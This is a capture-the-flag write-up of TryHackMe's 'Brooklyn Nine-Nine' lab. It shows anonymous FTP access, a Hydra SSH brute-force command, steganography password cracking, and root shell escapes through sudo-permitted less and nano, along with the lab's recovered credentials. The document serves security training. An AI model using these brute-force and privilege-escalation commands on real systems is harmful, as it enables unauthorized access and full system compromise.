# TryHackMe – Brooklyn Nine-Nine

This is a formal writeup for the **Brooklyn Nine-Nine** room on TryHackMe, rated as **easy**.  
The challenge teaches **service enumeration**, **anonymous FTP exploitation**, **credential brute-forcing**, **SSH access**, **steganography**, and **sudo misconfiguration abuse** via `less` and `nano`.

***

## Overview

Objectives of the room:

- Perform port scanning to identify exposed services.
- Exploit anonymous FTP access to retrieve sensitive information.
- Use gathered intelligence to brute-force SSH credentials with Hydra.
- Obtain SSH access, enumerate users, and retrieve the user flag.
- Identify a misconfigured sudo binary and escalate to root.
- Alternatively, exploit steganography hidden in the web application to obtain credentials for a second user and escalate via a different sudo binary.
- Retrieve the root flag via both intended attack paths.

***

## Port Scanning and Service Discovery

### Open ports

Full port scan to identify all services:

```bash
nmap -sV -sC -A -p- --min-rate 5000 -T4 <TARGET>
```

> **Note**: `-A` already includes `-sV` and `-sC`. They are listed explicitly here for didactic clarity.

**Result**: 3 ports open:
- **21/tcp** (ftp – vsftpd 3.0.3)
- **22/tcp** (ssh – OpenSSH 7.6)
- **80/tcp** (http – Apache httpd 2.4.29)

**Critical finding**: `ftp-anon: Anonymous FTP login allowed` — this is the primary attack vector and a high-severity misconfiguration.

***

## Vector 1 – FTP Anonymous Access + SSH Brute Force

### Anonymous FTP login

Connect to the FTP service without credentials:

```bash
ftp <TARGET>
```

When prompted:
- **Username**: `anonymous`
- **Password**: *(press ENTER)*

Login succeeds. List directory contents:

```bash
ls
```

**File found**: `note_to_jake.txt`

Retrieve it to the attack machine:

```bash
get note_to_jake.txt
```

### Analysing the note

```bash
cat note_to_jake.txt
```

**Contents**:
```
From Amy,
Jake please change your password. It is too weak and holt will be mad
if someone hacks into the nine nine
```

**Intelligence extracted**:
- Valid username confirmed: `jake`
- Password described as weak — highly susceptible to brute-force attack
- Additional usernames hinted: `amy`, `holt`

### SSH brute-force with Hydra

With a confirmed username and the knowledge that the password is weak, launch a dictionary attack against SSH:

```bash
hydra -l jake -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET> ssh
```

**Result**: Credentials found:
- **Username**: `jake`
- **Password**: `987654321`

### SSH access as jake

```bash
ssh jake@<TARGET>
```

Accept the host fingerprint prompt and authenticate with the recovered password. Login succeeds.

### Enumerating users and retrieving the user flag

```bash
ls -lah
cd ..
ls
```

Three home directories are present: `amy`, `holt`, `jake`.

Enumerate `amy` — nothing of value:

```bash
cd amy && ls -lah && cd ..
```

Enumerate `holt`:

```bash
cd holt && ls -lah
```

**User flag found**: `user.txt`

```bash
cat user.txt
```

### Privilege escalation via `less` (GTFOBins)

Attempt to access `/root` directly — denied as expected. Check sudo permissions:

```bash
sudo -l
```

**Finding**: `less` can be executed as root without a password.

Reference: [GTFOBins – less – Sudo](https://gtfobins.github.io/gtfobins/less/)

```bash
sudo less /etc/passwd
```

Once inside the pager, execute a shell escape:

```
!/bin/sh
```

Press ENTER. A root shell is spawned.

> **What this does**: `less` is a pager that supports shell command execution via `!`. Since it runs as root under `sudo`, any spawned subprocess inherits root privileges — a trivial but critical misconfiguration.

### Retrieving root.txt

```bash
cd /root
ls
cat root.txt
```

**Root flag obtained.**

***

## Vector 2 – Web Steganography + SSH as Holt

### Web enumeration on port 80

Navigate to `http://<TARGET>`. A static image is displayed with no visible interactive elements. Inspect the page source:

```
CTRL + U
```

**Hidden comment found**:
```html
<!-- Have you ever heard of steganography? -->
```

This hints that data is concealed within a file on the page. Perform directory enumeration to confirm there are no additional hidden endpoints:

```bash
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt
```

**Result**: No additional pages or files beyond the index. The only asset is the background image — `brooklyn99.jpg` — visible in the source code.

### Downloading the image

```bash
wget http://<TARGET>/brooklyn99.jpg
```

### Extracting hidden data with steghide

```bash
steghide extract -sf brooklyn99.jpg
```

> **Note**: Install if not available: `sudo apt install steghide`

A passphrase is required — unknown at this stage. Brute-force it with stegcracker:

```bash
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

> **Note**: Install if not available: `sudo apt install stegcracker`

Stegcracker outputs a file containing the extracted data. Inspect it:

```bash
cat brooklyn99.jpg.out
```

**Contents**:
```
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

### SSH access as holt

```bash
ssh holt@<TARGET>
```

Authenticate with the recovered password. Login succeeds. The user flag is immediately visible in the home directory:

```bash
ls -lah
cat user.txt
```

### Privilege escalation via `nano` (GTFOBins)

Check sudo permissions:

```bash
sudo -l
```

**Finding**: `nano` can be executed as root without a password.

Reference: [GTFOBins – nano – Sudo](https://gtfobins.github.io/gtfobins/nano/)

```bash
sudo nano
```

Inside nano, trigger the shell escape:

1. Press `CTRL + R` (Read File)
2. Press `CTRL + X` (Execute Command)
3. At the `Command to execute:` prompt, type:

```
reset; sh 1>&0 2>&0
```

4. Press ENTER.

A root shell is spawned.

> **What this does**: nano's "Read File" command supports executing an external command and piping its output into the editor. Since nano runs as root, the shell spawned inherits root privileges. `1>&0 2>&0` redirects stdout and stderr back to the terminal, making the shell interactive.

### Retrieving root.txt

```bash
cd /root
cat root.txt
```

**Root flag obtained.**

***

## Attack Path Comparison

| Aspect | Vector 1 | Vector 2 |
|---|---|---|
| Entry point | FTP anonymous access | HTTP steganography |
| Key tool | Hydra | stegcracker |
| User compromised | jake | holt |
| sudo binary abused | `less` | `nano` |
| Shell escape | `!/bin/sh` | `CTRL+R → CTRL+X → reset; sh` |

***

## Lessons Learned

This challenge demonstrates **two parallel Linux attack chains** converging on the same root:

1. **Service enumeration** → FTP, SSH, HTTP identified on ports 21, 22, 80
2. **Anonymous FTP** → sensitive note leaking a username and password hint
3. **Credential brute-force** → Hydra recovers `jake`'s weak SSH password
4. **Lateral enumeration** → user flag found in `holt`'s home directory
5. **Steganography** → hidden credentials for `holt` embedded in a JPEG
6. **Sudo misconfiguration** → `less` and `nano` both abusable for root shell escape

**Key takeaways**:
- **Anonymous FTP** must never be enabled in production — it exposes the filesystem to unauthenticated access.
- **Weak passwords** are trivially crackable with standard wordlists — enforce strong password policies.
- **Sudo on interactive binaries** (`less`, `nano`, `vim`, `python`) is an immediate critical misconfiguration — any of them can spawn arbitrary root shells.
- **Steganographic comments** in source code are always worth investigating during web enumeration.
- **GTFOBins** is the definitive reference for sudo, SUID, and capability-based privilege escalation.

**Strong OSCP relevance**: Covers dual-path enumeration, brute-force credential recovery, file-based intelligence gathering, steganography, and multiple sudo escape techniques.

***

## Flag Enumeration

### Flag 1 – User flag

**Location**: `/home/holt/user.txt`  
Accessible via Vector 1 (as jake navigating to holt's directory) or Vector 2 (directly as holt).

### Flag 2 – Root flag

**Location**: `/root/root.txt`  
Accessible only after privilege escalation via `less` (Vector 1) or `nano` (Vector 2).

***

## Disclaimer

> ⚠️ This writeup is for educational purposes only.  
> Techniques demonstrated are specific to TryHackMe training environments.  
> Do not use outside authorized lab environments or in violation of TryHackMe terms.
